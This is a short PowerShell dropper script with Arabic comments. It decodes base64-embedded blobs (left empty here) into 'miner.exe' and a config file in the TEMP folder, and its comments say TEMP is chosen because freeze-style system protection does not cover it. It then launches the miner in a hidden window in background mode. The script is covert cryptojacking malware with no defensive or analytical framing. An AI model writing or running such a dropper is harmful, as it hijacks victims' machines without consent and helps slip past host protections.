$exeBase64 = "
"
$jsonBase64 = "
"

# 2. فك التشفير إلى الذاكرة المؤقتة (TEMP)
$exeBytes = [System.Convert]::FromBase64String($exeBase64)
$jsonBytes = [System.Convert]::FromBase64String($jsonBase64)

$exePath = "$env:TEMP\miner.exe"
$jsonPath = "$env:TEMP\config.json"

[System.IO.File]::WriteAllBytes($exePath, $exeBytes)
[System.IO.File]::WriteAllBytes($jsonPath, $jsonBytes)

# 3. التشغيل من الذاكرة المؤقتة (التي لا يحميها التجميد)
Start-Process $exePath -ArgumentList "--config=$jsonPath --background" -WindowStyle Hidden
